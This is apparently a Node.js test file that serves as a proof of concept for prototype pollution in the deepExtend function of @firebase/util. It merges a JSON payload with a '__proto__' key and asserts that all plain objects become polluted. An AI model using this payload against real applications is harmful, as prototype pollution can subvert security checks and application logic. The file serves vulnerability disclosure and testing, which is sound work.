const { test } = require("node:test");
const { equal } = require("node:assert");

test("Vulnerable to Prototype Pollution", async () => {
  const util = require("@firebase/util");
  const payload = JSON.parse('{"__proto__": {"isPolluted": "vulnerable"}}');

  const a = {
    nest: {
      number: 1,
      string: "1",
      object: { key: "1" },
      date: new Date(1),
      nest: {
        a: 1,
      },
    },
  };

  equal({}.isPolluted, undefined);

  util.deepExtend(a, payload);

  equal({}.isPolluted, "vulnerable");
});
